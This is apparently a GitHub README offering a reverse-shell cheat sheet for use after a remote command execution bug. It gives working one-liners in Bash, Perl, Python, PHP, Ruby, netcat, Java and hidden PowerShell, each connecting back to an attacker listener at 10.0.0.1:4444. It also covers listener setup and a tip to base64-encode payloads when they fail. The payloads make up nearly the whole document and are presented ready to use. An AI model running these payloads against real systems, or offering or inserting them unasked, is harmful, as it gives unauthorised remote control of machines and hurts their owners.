# Getting reverse shell HOWTOs &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/shell1.png" width="30"/>
After having success with a remote command execution vulnerability, you'll probably wish to get an interactive shell. You will see that your target cannot execute any reverse shell scripting languages; it's limited to the current vulnerable application language.  
  
Before starting, you will need netcat installed on your listener host.
  
**Ubuntu/Debian distrib:** *sudo apt-get install nc -y*  
**Other Linux distros (CentOS, RedHat, ...):** *yum install nc -y*  
  
Now that netcat is successfully installed on your listener host, type: *nc -l -v 4444*  
You will find below different ways in obtaining a reverse shell in multiple langs.  
  
## Bash &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/bourne_again.jpg" width="20"/>
Based that your local IP would be *10.0.0.1* and listener port on netcat is *4444*
```
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```
  
## Perl &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/perl.jpg" width="50"/>
```
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
  
## Python &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/python.jpg" width="70"/>
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/php.png" width="40"/>
Assuming that the TCP connection is using file descriptor 3. If it doesn't work, try 4, 5, 6...
  
```
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
  
## Ruby &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/ruby.png" width="20"/>
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
  
## Netcat &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/netcat.gif" width="80"/>
Most of the time in a prod environment, netcat won't be installed. Still, you can give it a try ;)
  
```
nc -e /bin/sh 10.0.0.1 4444
```
Since there is multiple different versions of netcat, the syntax can be different. If the first one above didn't work, try this:
  
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
```
  
## Java &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/java1.jpg" width="40"/>
Tried it on a Jenkins local server and works like a charm
  
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
  
Windows environment version:
```
String host="10.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
  
## Powershell &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/Powershell.JPG" width="30"/>
  
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## Conclusion
Sometimes, getting a reverse shell back on our listener requires more work; if you still don't have success getting a reverse shell, it's possible that the payload sending the command for getting the rev shell needs to be encoded with something like base64 or base64url. If you have any questions on that subject, don't hesitate to pm me.

E-mail: syriusbughunt@protonmail.com
